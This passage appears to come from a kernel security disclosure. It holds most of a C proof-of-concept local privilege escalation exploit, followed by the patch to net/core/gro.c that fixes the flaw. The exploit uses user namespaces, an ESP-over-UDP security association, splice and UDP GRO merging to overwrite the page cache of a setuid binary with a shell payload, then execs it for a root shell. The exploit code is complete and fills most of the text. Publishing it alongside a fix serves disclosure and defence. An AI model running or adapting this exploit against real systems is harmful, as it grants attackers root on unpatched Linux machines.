> 		snprintf(map, sizeof(map), "0 %u 1\n", gid);
> 		fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
> 		sync_write(mp[1]); _exit(0);
> 	}
> 	close(rp[0]); close(mp[1]);
> 	if (unshare(CLONE_NEWUSER) < 0) gate_fail("unshare(CLONE_NEWUSER)");
> 	sync_write(rp[1]); sync_read(mp[0]); waitpid(c, NULL, 0);
> 	setresgid(0, 0, 0); setresuid(0, 0, 0);
> }
> 
> /* ---- XFRM SA ---- */
> 
> static void add_sa(void)
> {
> 	char buf[4096] = {};
> 	char ab[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_key)];
> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
> 	nlh->nlmsg_type = XFRM_MSG_NEWSA;
> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
> 	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
> 	xs->sel.family = AF_INET;
> 	inet_pton(AF_INET, ADDR_SRC, &xs->saddr.a4);
> 	inet_pton(AF_INET, ADDR_DST, &xs->id.daddr.a4);
> 	xs->id.spi = htonl(ESP_SPI); xs->id.proto = IPPROTO_ESP;
> 	xs->family = AF_INET; xs->mode = XFRM_MODE_TRANSPORT; xs->replay_window = 0;
> 	xs->lft.soft_byte_limit = xs->lft.hard_byte_limit = XFRM_INF;
> 	xs->lft.soft_packet_limit = xs->lft.hard_packet_limit = XFRM_INF;
> 	memset(ab, 0, sizeof(ab));
> 	struct xfrm_algo_aead *a = (struct xfrm_algo_aead *)ab;
> 	strcpy(a->alg_name, "rfc4106(gcm(aes))");
> 	a->alg_key_len = sizeof(xfrm_key) * 8;
> 	a->alg_icv_len = ICV_LEN * 8;
> 	memcpy(a->alg_key, xfrm_key, sizeof(xfrm_key));
> 	add_nlattr(nlh, sizeof(buf), XFRMA_ALG_AEAD, ab, sizeof(ab));
> 	struct xfrm_encap_tmpl encap = {};
> 	encap.encap_type = UDP_ENCAP_ESPINUDP;
> 	encap.encap_sport = htons(UDP_PORT);
> 	encap.encap_dport = htons(UDP_PORT);
> 	add_nlattr(nlh, sizeof(buf), XFRMA_ENCAP, &encap, sizeof(encap));
> 	nl_talk(nlh, NETLINK_XFRM, "add SA");
> }
> 
> /* ---- AES-GCM keystream ---- */
> 
> static void aes_ecb_block(int alg_fd, const unsigned char in[16], unsigned char out[16])
> {
> 	char cb[CMSG_SPACE(sizeof(uint32_t))] = {};
> 	struct iovec iov = { (void *)in, 16 };
> 	struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_control = cb, .msg_controllen = sizeof(cb) };
> 	uint32_t op = ALG_OP_ENCRYPT;
> 	struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
> 	cm->cmsg_level = SOL_ALG; cm->cmsg_type = ALG_SET_OP;
> 	cm->cmsg_len = CMSG_LEN(sizeof(op));
> 	memcpy(CMSG_DATA(cm), &op, sizeof(op));
> 	int ofd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
> 	if (ofd < 0) die("AF_ALG accept");
> 	if (sendmsg(ofd, &msg, 0) != 16) die("AF_ALG send");
> 	if (read(ofd, out, 16) != 16) die("AF_ALG read");
> 	close(ofd);
> }
> 
> /*
>  * rfc4106 shifts the 8-byte ESP IV into the AAD, so the inner GCM
>  * ciphertext starts at frag byte 0. The target byte is at CTR position 0.
>  */
> #define KS_POS 0
> 
> static uint16_t stream_nonce[256];
> static bool stream_have[256];
> 
> static void build_stream_table(void)
> {
> 	struct sockaddr_alg sa = { .salg_family = AF_ALG };
> 	strcpy((char *)sa.salg_type, "skcipher");
> 	strcpy((char *)sa.salg_name, "ecb(aes)");
> 	int fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
> 	if (fd < 0) die("AF_ALG");
> 	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("AF_ALG bind");
> 	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_key, 16) < 0) die("AF_ALG key");
> 
> 	unsigned int count = 0;
> 	for (unsigned nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
> 		unsigned char iv[8], cb[16], out[16];
> 		memset(iv, 0xcc, sizeof(iv));
> 		store_be32(iv + 4, nonce);
> 		memcpy(cb, &xfrm_key[16], 4);
> 		memcpy(cb + 4, iv, 8);
> 		store_be32(cb + 12, 2 + KS_POS / 16);
> 		aes_ecb_block(fd, cb, out);
> 		unsigned char b = out[KS_POS % 16];
> 		if (stream_have[b]) continue;
> 		stream_have[b] = true;
> 		stream_nonce[b] = (uint16_t)nonce;
> 		count++;
> 	}
> 	close(fd);
> 	if (count < 256) { fprintf(stderr, "incomplete stream table: %u/256\n", count); exit(2); }
> }
> 
> /* ---- main ---- */
> 
> int main(void)
> {
> 	setvbuf(stdout, NULL, _IONBF, 0);
> 
> 	printf("[*] uid=%d euid=%d gid=%d egid=%d\n",
> 	       getuid(), geteuid(), getgid(), getegid());
> 	printf("[*] mode=gro_espinudp_pagecache_replace\n\n");
> 
> 	struct stat st;
> 	if (stat(target_file, &st) < 0 || !S_ISREG(st.st_mode) || st.st_size < PAYLOAD_LEN + SPLICE_LEN)
> 		die("stat target");
> 
> 	printf("[*] target=%s size=%lld\n", target_file, (long long)st.st_size);
> 
> 	build_stream_table();
> 	printf("[*] stream_table=256 entries at ciphertext position %d\n", KS_POS);
> 
> 	/*
> 	 * Fork before entering the user namespace. The child enters the
> 	 * user/net namespace and does all the page-cache corruption. The
> 	 * parent stays in the init user namespace so that execve() of the
> 	 * corrupted setuid su binary honors the setuid bit, giving a real
> 	 * root shell rather than a fake namespace-root shell.
> 	 */
> 	fflush(stdout); fflush(stderr);
> 	pid_t worker = fork();
> 	if (worker < 0) die("fork worker");
> 	if (worker > 0) {
> 		int wstatus;
> 		waitpid(worker, &wstatus, 0);
> 		if (WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 1) {
> 			char *argv[] = { (char *)target_file, NULL };
> 			char *envp[] = { NULL };
> 			execve(target_file, argv, envp);
> 		}
> 		return WIFEXITED(wstatus) ? WEXITSTATUS(wstatus) : 2;
> 	}
> 
> 	/* Child: enter user namespace and do the corruption */
> 	if (getuid() != 0) setup_userns();
> 	if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
> 	if_up("lo");
> 	create_veth();
> 
> 	int p_ns[2], p_veth[2], p_rdy[2];
> 	if (pipe(p_ns) < 0 || pipe(p_veth) < 0 || pipe(p_rdy) < 0) die("pipe");
> 	fflush(stdout); fflush(stderr);
> 
> 	pid_t rx = fork();
> 	if (rx < 0) die("fork");
> 
> 	if (rx == 0) {
> 		close(p_ns[0]); close(p_veth[1]); close(p_rdy[0]);
> 		if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
> 		if (unshare(CLONE_NEWNS) < 0) gate_fail("unshare(CLONE_NEWNS)");
> 		mount("", "/", NULL, MS_PRIVATE | MS_REC, NULL);
> 		mount("sysfs", "/sys", "sysfs", 0, NULL);
> 		sync_write(p_ns[1]); close(p_ns[1]);
> 		sync_read(p_veth[0]); close(p_veth[0]);
> 		if_up("lo");
> 		ethtool_set(VETH1, ETHTOOL_SGRO, 1);
> 		if_up(VETH1);
> 		enable_veth_napi(VETH1);
> 		add_addr(VETH1, ADDR_DST);
> 		add_sa();
> 		int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
> 		if (ufd < 0) gate_fail("socket");
> 		struct sockaddr_in ba = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
> 		inet_pton(AF_INET, ADDR_DST, &ba.sin_addr);
> 		if (bind(ufd, (struct sockaddr *)&ba, sizeof(ba)) < 0) gate_fail("bind");
> 		int et = UDP_ENCAP_ESPINUDP, gro = 1;
> 		setsockopt(ufd, IPPROTO_UDP, UDP_ENCAP, &et, sizeof(et));
> 		setsockopt(ufd, IPPROTO_UDP, UDP_GRO, &gro, sizeof(gro));
> 		sync_write(p_rdy[1]);
> 		pause();
> 		_exit(0);
> 	}
> 
> 	close(p_ns[1]); close(p_veth[0]); close(p_rdy[1]);
> 	sync_read(p_ns[0]); close(p_ns[0]);
> 	move_to_netns(VETH1, rx);
> 	sync_write(p_veth[1]); close(p_veth[1]);
> 	if_up(VETH0); add_addr(VETH0, ADDR_SRC);
> 	ethtool_set(VETH0, ETHTOOL_STSO, 0);
> 	ethtool_set(VETH0, ETHTOOL_SGSO, 0);
> 
> 	/*
> 	 * Add a netem delay on the sender veth so both datagrams sit in the
> 	 * qdisc until the timer fires, then get released into veth_xmit()
> 	 * within the same softirq context. This guarantees both land in one
> 	 * NAPI poll cycle for GRO to merge them, without needing sysfs
> 	 * gro_flush_timeout (which requires capable(CAP_NET_ADMIN) in the
> 	 * init namespace). tc uses netlink with ns_capable(), so it works
> 	 * from a user namespace.
> 	 */
> 	if (system("tc qdisc add dev " VETH0 " root netem delay 20ms") != 0)
> 		gate_fail("tc netem");
> 	usleep(50000);
> 
> 	sync_read(p_rdy[0]); close(p_rdy[0]);
> 
> 	int sock = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
> 	if (sock < 0) die("socket");
> 	struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
> 	struct sockaddr_in da = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
> 	inet_pton(AF_INET, ADDR_SRC, &sa.sin_addr);
> 	inet_pton(AF_INET, ADDR_DST, &da.sin_addr);
> 	bind(sock, (struct sockaddr *)&sa, sizeof(sa));
> 	connect(sock, (struct sockaddr *)&da, sizeof(da));
> 
> 	int target_fd = open(target_file, O_RDONLY | O_CLOEXEC);
> 	if (target_fd < 0) die("open target");
> 
> 	uint32_t seq = 1;
> 	size_t total_changed = 0;
> 	int delay_ms = 20;
> 	int sleep_us = 40000;
> 	struct timespec last_ok;
> 	clock_gettime(CLOCK_MONOTONIC, &last_ok);
> 
> 	printf("[*] replacing %d bytes starting at offset 0\n", PAYLOAD_LEN);
> 
> 	/* Warmup: send a dummy pair to prime the netem/NAPI path */
> 	{
> 		unsigned char w[16 + SPLICE_LEN];
> 		memset(w, 0, sizeof(w));
> 		store_be32(w, ESP_SPI);
> 		store_be32(w + 4, seq++);
> 		send(sock, w, sizeof(w), 0);
> 		store_be32(w + 4, seq++);
> 		send(sock, w, sizeof(w), 0);
> 		usleep(sleep_us);
> 	}
> 
> 	for (int pass = 0; ; pass++) {
> 		size_t pass_changed = 0, remaining = 0;
> 
> 		for (int idx = 0; idx < PAYLOAD_LEN; idx++) {
> 			unsigned char cur = read_byte_at(target_fd, idx);
> 			if (cur == shell_elf[idx])
> 				continue;
> 			remaining++;
> 
> 			unsigned char need_ks = cur ^ shell_elf[idx];
> 			uint16_t nonce = stream_nonce[need_ks];
> 			unsigned char iv[8];
> 			memset(iv, 0xcc, sizeof(iv));
> 			store_be32(iv + 4, nonce);
> 
> 			unsigned char hdr[16];
> 			char hp[] = "/tmp/fgro-XXXXXX";
> 			int hfd = mkstemp(hp); unlink(hp);
> 			store_be32(hdr, ESP_SPI); store_be32(hdr + 4, seq++);
> 			memcpy(hdr + 8, iv, 8);
> 			write(hfd, hdr, 16);
> 
> 			int pfd[2];
> 			pipe(pfd);
> 			loff_t ho = 0;
> 			splice(hfd, &ho, pfd[1], NULL, 16, 0);
> 			loff_t so = (loff_t)idx;
> 			splice(target_fd, &so, pfd[1], NULL, SPLICE_LEN, 0);
> 			close(hfd);
> 
> 			unsigned char p1[16 + SPLICE_LEN];
> 			store_be32(p1, ESP_SPI); store_be32(p1 + 4, seq++);
> 			memcpy(p1 + 8, iv, 8);
> 			memset(p1 + 16, 0x41, SPLICE_LEN);
> 			send(sock, p1, sizeof(p1), 0);
> 
> 			int cork = 1;
> 			setsockopt(sock, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork));
> 			splice(pfd[0], NULL, sock, NULL, 16 + SPLICE_LEN, 0);
> 			cork = 0;
> 			setsockopt(sock, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork));
> 			close(pfd[0]); close(pfd[1]);
> 
> 			usleep(sleep_us);
> 
> 			unsigned char got = read_byte_at(target_fd, idx);
> 			if (got == shell_elf[idx]) {
> 				total_changed++;
> 				pass_changed++;
> 				clock_gettime(CLOCK_MONOTONIC, &last_ok);
> 				printf("\r[+] byte %3d/%-3d  0x%02x -> 0x%02x  ok  (%zu changed)",
> 				       idx, PAYLOAD_LEN, cur, got, total_changed);
> 			} else {
> 				printf("\r[-] byte %3d/%-3d  0x%02x -> 0x%02x (want 0x%02x) MISS",
> 				       idx, PAYLOAD_LEN, cur, got, shell_elf[idx]);
> 			}
> 			fflush(stdout);
> 		}
> 
> 		if (remaining == 0)
> 			break;
> 
> 		size_t still_wrong = 0;
> 		for (int idx = 0; idx < PAYLOAD_LEN; idx++)
> 			if (read_byte_at(target_fd, idx) != shell_elf[idx])
> 				still_wrong++;
> 
> 		if (still_wrong == 0)
> 			break;
> 
> 		struct timespec now;
> 		clock_gettime(CLOCK_MONOTONIC, &now);
> 		long elapsed = (now.tv_sec - last_ok.tv_sec) * 1000 +
> 			       (now.tv_nsec - last_ok.tv_nsec) / 1000000;
> 		if (elapsed > 30000) {
> 			printf("\n[!] %zu bytes stuck after 30s without progress\n",
> 			       still_wrong);
> 			break;
> 		}
> 
> 		if (delay_ms < 500) {
> 			delay_ms = delay_ms < 250 ? delay_ms * 2 : 500;
> 			sleep_us = delay_ms * 2000;
> 			char cmd[128];
> 			snprintf(cmd, sizeof(cmd),
> 				 "tc qdisc change dev " VETH0 " root netem delay %dms",
> 				 delay_ms);
> 			system(cmd);
> 		}
> 		printf("\n[*] pass %d: %zu ok, %zu still wrong, delay now %dms, retrying\n",
> 		       pass + 1, pass_changed, still_wrong, delay_ms);
> 		fflush(stdout);
> 	}
> 
> 	close(target_fd);
> 	close(sock);
> 	kill(rx, SIGTERM);
> 	waitpid(rx, NULL, 0);
> 
> 	/* Final verification: count how many bytes match shell_elf */
> 	int final_fd = open(target_file, O_RDONLY | O_CLOEXEC);
> 	size_t matching = 0;
> 	if (final_fd >= 0) {
> 		for (int i = 0; i < PAYLOAD_LEN; i++)
> 			if (read_byte_at(final_fd, i) == shell_elf[i])
> 				matching++;
> 		close(final_fd);
> 	}
> 
> 	printf("\n\n");
> 	if (total_changed > 0) {
> 		printf("VULNERABLE: %zu/%d payload bytes now match shell_elf "
> 		       "(%zu written via GRO flag-strip)\n",
> 		       matching, PAYLOAD_LEN, total_changed);
> 		_exit(1);
> 	}
> 
> 	printf("FIXED: 0/%d bytes changed\n", PAYLOAD_LEN);
> 	_exit(0);
> }

> From c3ec785f197bf329c443aa547eb70864e2ef29ac Mon Sep 17 00:00:00 2001
> From: Sultan Alsawaf <sultan@kerneltoast.com>
> Date: Wed, 13 May 2026 21:47:51 -0700
> Subject: [PATCH] net: gro: propagate SKBFL_SHARED_FRAG in skb_gro_receive()
> 
> skb_gro_receive() moves frag descriptors from the incoming skb to the
> GRO accumulator through two frag-transfer paths (the direct frag-move
> loop and the head_frag + memcpy path) without propagating the
> SKBFL_SHARED_FRAG flag from the incoming skb's shinfo->flags. As a
> result, the accumulator ends up holding references to externally owned
> or page-cache-backed pages while reporting skb_has_shared_frag() as
> false.
> 
> This is the same bug class as CVE-2026-46300 (d8cfbcdd07557, "net:
> skbuff: propagate shared-frag marker through frag-transfer helpers"),
> which fixed the identical omission in __pskb_copy_fclone(),
> skb_try_coalesce(), and skb_shift(). skb_gro_receive() was missed in
> that fix since it lives in net/core/gro.c rather than net/core/skbuff.c.
> 
> The impact is observable through ESP-over-UDP with UDP GRO: splice()
> attaches page-cache pages to a UDP skb, setting SKBFL_SHARED_FRAG via
> ip_append_page(). When two such datagrams are GRO-merged via
> skb_gro_receive(), the flag is dropped. After udp_rcv_segment()
> re-segments the merged GSO skb, the fresh segments carry the
> page-cache frags without the shared-frag marker. esp_input() then sees
> !skb_cloned() && !skb_has_shared_frag() and takes the skip_cow fast
> path, decrypting in place over the page-cache pages. Because AES-GCM
> CTR decryption runs before the authentication tag is verified, the
> page cache is corrupted even though the tag check subsequently fails.
> 
> Fix it by propagating SKBFL_SHARED_FRAG from the incoming skb to the
> accumulator in both frag-transfer paths, matching what the skbuff.c
> helpers already do. The third path (frag_list merge at the "merge:"
> label) chains the entire incoming skb onto the accumulator's frag_list
> without moving individual frag descriptors, so each sub-skb retains
> its own flags and no propagation is needed there.
> 
> Fixes: cef401de7be8 ("net: fix possible wrong checksum generation")
> Fixes: f4c50a4034e6 ("xfrm: esp: avoid in-place decrypt on shared skb frags")
> Cc: stable@vger.kernel.org
> Co-authored-by: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
> Signed-off-by: Sultan Alsawaf <sultan@kerneltoast.com>
> ---
>  net/core/gro.c | 4 ++++
>  1 file changed, 4 insertions(+)
> 
> diff --git a/net/core/gro.c b/net/core/gro.c
> index 31d21de5b15a7..4ac41ced13aeb 100644
> --- a/net/core/gro.c
> +++ b/net/core/gro.c
> @@ -145,6 +145,8 @@ int skb_gro_receive(struct sk_buff *p, struct sk_buff *skb)
>  		skb_frag_off_add(frag, offset);
>  		skb_frag_size_sub(frag, offset);
>  
> +		pinfo->flags |= skbinfo->flags & SKBFL_SHARED_FRAG;
> +
>  		/* all fragments truesize : remove (head size + sk_buff) */
>  		new_truesize = SKB_TRUESIZE(skb_end_offset(skb));
>  		delta_truesize = skb->truesize - new_truesize;
> @@ -176,6 +178,8 @@ int skb_gro_receive(struct sk_buff *p, struct sk_buff *skb)
>  		memcpy(frag + 1, skbinfo->frags, sizeof(*frag) * skbinfo->nr_frags);
>  		/* We dont need to clear skbinfo->nr_frags here */
>  
> +		pinfo->flags |= skbinfo->flags & SKBFL_SHARED_FRAG;
> +
>  		new_truesize = SKB_DATA_ALIGN(sizeof(struct sk_buff));
>  		delta_truesize = skb->truesize - new_truesize;
>  		skb->truesize = new_truesize;
> -- 
> 2.54.0
> 


